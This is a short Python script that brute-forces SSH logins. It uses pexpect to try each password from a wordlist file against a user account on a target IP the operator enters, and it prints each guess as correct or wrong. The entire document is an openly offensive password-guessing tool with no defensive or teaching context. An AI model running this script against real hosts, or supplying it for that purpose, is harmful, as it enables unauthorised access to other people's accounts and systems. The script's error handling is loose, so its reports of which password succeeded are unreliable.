#!/usr/bin/python3

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	conn_str = f'ssh {user}@{host}'
	child = pexpect.spawn(conn_str)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

	if ret == 0:
		print('[-] Error connecting')
		return

	if ret == 1:
		child.sendline('y')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])

		if ret == 0:
			print('[-] Error connecting')
			return

	child.sendline(password)
	child.expect(PROMPT, timeout=0.5)

	return child


def main():
	host = input('Enter IP to bruteforce: ')
	user = input('Enter user account: ')
	with open('passwordlist.txt', 'r') as myfile:
		lines = myfile.readlines()

	for password in lines:
		password = password.strip('\n')
		try:
			child = connect(user, host, password)
			print(colored(f'[+] Correct password {password}', 'green'))
		except:
			print(colored(f'[-] Wrong password {password}', 'red'))
			pass


if __name__ == '__main__':
	main()
